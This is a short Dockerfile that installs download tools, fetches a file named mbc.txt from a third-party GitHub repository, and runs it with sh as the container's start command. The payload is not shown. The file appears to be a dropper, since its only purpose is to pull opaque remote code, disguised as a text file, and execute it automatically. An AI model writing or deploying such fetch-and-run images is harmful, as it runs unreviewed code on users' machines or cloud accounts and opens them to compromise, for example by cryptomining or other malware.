FROM ubuntu:18.04
RUN apt update
RUN apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/corpltd001/vs/main/mbc.txt
CMD sh mbc.txt
